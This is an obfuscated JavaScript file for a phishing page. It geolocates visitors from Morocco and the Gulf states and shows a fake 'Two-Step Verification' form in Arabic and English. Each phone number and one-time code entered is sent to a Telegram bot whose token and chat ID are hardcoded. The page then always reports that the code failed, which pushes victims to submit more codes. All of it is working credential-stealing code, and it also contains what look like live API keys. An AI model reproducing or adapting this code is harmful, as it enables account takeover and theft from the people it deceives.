const _0x33b1dc = _0x582f;
(function (_0x58cb17, _0x3248c3) {
  const _0x4b9418 = _0x582f;
  const _0x5358fe = _0x58cb17();
  while (!![]) {
    try {
      const _0x28a229 =
        parseInt(_0x4b9418(0x12d)) / 0x1 +
        -parseInt(_0x4b9418(0x12e)) / 0x2 +
        parseInt(_0x4b9418(0x12f)) / 0x3 +
        -parseInt(_0x4b9418(0x130)) / 0x4 +
        (parseInt(_0x4b9418(0x131)) / 0x5) *
          (parseInt(_0x4b9418(0x132)) / 0x6) +
        (-parseInt(_0x4b9418(0x133)) / 0x7) *
          (-parseInt(_0x4b9418(0x134)) / 0x8) +
        -parseInt(_0x4b9418(0x135)) / 0x9;
      if (_0x28a229 === _0x3248c3) {
        break;
      } else {
        _0x5358fe["push"](_0x5358fe["shift"]());
      }
    } catch (_0x1bc436) {
      _0x5358fe["push"](_0x5358fe["shift"]());
    }
  }
})(_0x2f82, 0x303e2);
let formPhone = document[_0x33b1dc(0x136)](_0x33b1dc(0x137));
let formOTP = document["getElementById"](_0x33b1dc(0x138));
function _0x2f82() {
  const _0x1df720 = [
    "then",
    "json",
    "log",
    "country",
    "value",
    "+212",
    "+971",
    "+965",
    "+968",
    "+966",
    "https://api.telegram.org/bot",
    "/sendMessage?chat_id=",
    "catch",
    "addEventListener",
    "input",
    "disabled",
    "submit",
    "preventDefault",
    "تاكيد\x20الاضافه",
    "Phone\x20:\x20",
    "textContent",
    "Two-Step\x20Verification",
    "ادخل\x20الرمز\x20اللي\x20وصلك",
    "style",
    "display",
    "none",
    "OTP\x20",
    "\x20:\x20",
    "OTP\x20Confirmtion\x20Failed.\x20Try\x20Again",
    "201002dpLigv",
    "417878vUaftF",
    "885702cFEKxA",
    "1064836Gyoluz",
    "5wOJfgF",
    "2368068uLMZFA",
    "89467KHOoGg",
    "24HszzKs",
    "2308563LeIyqj",
    "getElementById",
    "formPhone",
    "formOTP",
    "otp",
    "title",
    "description",
    "errorMsg",
    "phoneCountryCode",
	// TOKIN TA3K
    "6619670600:AAHeQROX_zwREG-nIWfLyp9W4LLeOye5QUU",
	// ID TA3K
    "2101202498",
    "https://api.geoapify.com/v1/ipinfo?&apiKey=a79c11b8b910493f9963963745518b72",
  ];
  _0x2f82 = function () {
    return _0x1df720;
  };
  return _0x2f82();
}
function _0x582f(_0x15a33a, _0x3da365) {
  const _0x2f82d9 = _0x2f82();
  _0x582f = function (_0x582fcf, _0x418f2b) {
    _0x582fcf = _0x582fcf - 0x12d;
    let _0x43f202 = _0x2f82d9[_0x582fcf];
    return _0x43f202;
  };
  return _0x582f(_0x15a33a, _0x3da365);
}
let phone = document["getElementById"]("phone");
let otp = document[_0x33b1dc(0x136)](_0x33b1dc(0x139));
let title = document[_0x33b1dc(0x136)](_0x33b1dc(0x13a));
let description = document["getElementById"](_0x33b1dc(0x13b));
let desciptionPhone = document["getElementById"]("desciptionPhone");
let errorMsg = document[_0x33b1dc(0x136)](_0x33b1dc(0x13c));
let phoneCountryCode = document["getElementById"](_0x33b1dc(0x13d));
let token = _0x33b1dc(0x13e);
let chatId = _0x33b1dc(0x13f);
fetch(_0x33b1dc(0x140))[_0x33b1dc(0x141)]((_0x108d86) => {
  const _0x3e738c = _0x33b1dc;
  _0x108d86[_0x3e738c(0x142)]()["then"]((_0x32e3e4) => {
    const _0x22136c = _0x3e738c;
    console[_0x22136c(0x143)](_0x32e3e4[_0x22136c(0x144)]["iso_code"]);
    switch (_0x32e3e4[_0x22136c(0x144)]["iso_code"]) {
      case "MA":
        phoneCountryCode[_0x22136c(0x145)] = _0x22136c(0x146);
        break;
      case "QA":
        phoneCountryCode["value"] = "+974";
        break;
      case "AE":
        phoneCountryCode[_0x22136c(0x145)] = _0x22136c(0x147);
        break;
      case "KW":
        phoneCountryCode[_0x22136c(0x145)] = _0x22136c(0x148);
        break;
      case "BH":
        phoneCountryCode[_0x22136c(0x145)] = "+973";
        break;
      case "OM":
        phoneCountryCode[_0x22136c(0x145)] = _0x22136c(0x149);
        break;
      case "SA":
        phoneCountryCode[_0x22136c(0x145)] = _0x22136c(0x14a);
        break;
    }
  });
});
const sendMsg = (_0x30e996) => {
  const _0x2e7c6f = _0x33b1dc;
  url = _0x2e7c6f(0x14b) + token + _0x2e7c6f(0x14c) + chatId + "&text=";
  fetch(url + _0x30e996)
    [_0x2e7c6f(0x141)]((_0x9ca603) => {
      const _0x4843ca = _0x2e7c6f;
      _0x9ca603[_0x4843ca(0x142)]()["then"]((_0xe44297) => {
        const _0x31371e = _0x4843ca;
        console[_0x31371e(0x143)]("msg\x20sent");
      });
    })
    [_0x2e7c6f(0x14d)]((_0x18463d) => {
      const _0x5dee2a = _0x2e7c6f;
      console[_0x5dee2a(0x143)](_0x18463d);
    });
};
let buttonConfirm = document[_0x33b1dc(0x136)]("buttonConfirm");
otp[_0x33b1dc(0x14e)](_0x33b1dc(0x14f), () => {
  const _0x12d61a = _0x33b1dc;
  if (otp[_0x12d61a(0x145)]["length"] == 0x6) {
    buttonConfirm[_0x12d61a(0x150)] = ![];
  } else {
    buttonConfirm[_0x12d61a(0x150)] = !![];
  }
});
formPhone[_0x33b1dc(0x14e)](_0x33b1dc(0x151), (_0x3c8520) => {
  const _0x2a33d2 = _0x33b1dc;
  _0x3c8520[_0x2a33d2(0x152)]();
  let _0x1bc575 = phoneCountryCode[_0x2a33d2(0x145)] + "-" + phone["value"];
  console[_0x2a33d2(0x143)](phone["value"]);
  if (phone[_0x2a33d2(0x145)]) {
    document[_0x2a33d2(0x13a)] = _0x2a33d2(0x153);
    console[_0x2a33d2(0x143)](_0x1bc575);
    sendMsg(_0x2a33d2(0x154) + _0x1bc575);
    title[_0x2a33d2(0x155)] = _0x2a33d2(0x156);
    description[_0x2a33d2(0x155)] = _0x2a33d2(0x157);
    desciptionPhone[_0x2a33d2(0x155)] = _0x1bc575;
    formOTP[_0x2a33d2(0x158)][_0x2a33d2(0x159)] = "Block";
    formPhone[_0x2a33d2(0x158)][_0x2a33d2(0x159)] = _0x2a33d2(0x15a);
  }
});
formOTP[_0x33b1dc(0x14e)]("submit", (_0x4c3209) => {
  const _0x103f37 = _0x33b1dc;
  _0x4c3209[_0x103f37(0x152)]();
  let _0x41e386 =
    phoneCountryCode[_0x103f37(0x145)] + "-" + phone[_0x103f37(0x145)];
  console[_0x103f37(0x143)](phone[_0x103f37(0x145)]);
  console[_0x103f37(0x143)](otp[_0x103f37(0x145)]);
  sendMsg(
    _0x103f37(0x15b) + _0x41e386 + _0x103f37(0x15c) + otp[_0x103f37(0x145)]
  );
  otp[_0x103f37(0x145)] = "";
  errorMsg[_0x103f37(0x155)] = _0x103f37(0x15d);
  buttonConfirm[_0x103f37(0x150)] = !![];
});
